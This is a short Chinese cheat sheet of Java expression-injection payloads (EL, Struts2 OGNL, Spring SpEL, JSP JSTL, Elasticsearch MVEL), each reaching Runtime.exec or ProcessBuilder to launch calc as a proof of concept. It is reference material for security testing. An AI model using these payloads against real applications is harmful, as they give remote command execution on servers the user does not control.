# 代码注入

> From https://y4er.com/post/java-expression-injection/

## 通用payload

```java
${pageContext}
${pageContext.getSession().getServletContext().getClassLoader().getResource("")}
${header}
${applicationScope}
${pageContext.setAttribute("a","".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"calc.exe"))}
```

## Struts2 OGNL

```java
ActionContext AC = ActionContext.getContext();
String expression = "${(new java.lang.ProcessBuilder('calc')).start()}";
AC.getValueStack().findValue(expression));
```

## Spring SPEL

```java
String expression = "T(java.lang.Runtime).getRuntime().exec(/"calc/")";
String result = parser.parseExpression(expression).getValue().toString();
```

## JSP JSTL_EL

```java
<spring:message text="${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}">
</spring:message>
```

## Elasticsearch MVEL
```java
String expression = "new java.lang.ProcessBuilder(/"calc/").start();";  
Boolean result = (Boolean) MVEL.eval(expression, vars);
```